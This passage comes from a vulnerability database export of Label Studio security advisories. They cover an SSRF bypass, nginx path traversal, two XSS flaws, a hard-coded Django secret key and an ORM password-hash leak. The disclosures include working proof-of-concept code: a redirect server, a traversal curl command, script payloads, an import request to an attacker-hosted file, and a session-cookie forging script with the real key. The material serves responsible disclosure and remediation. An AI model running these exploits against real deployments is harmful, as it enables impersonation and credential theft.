could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values 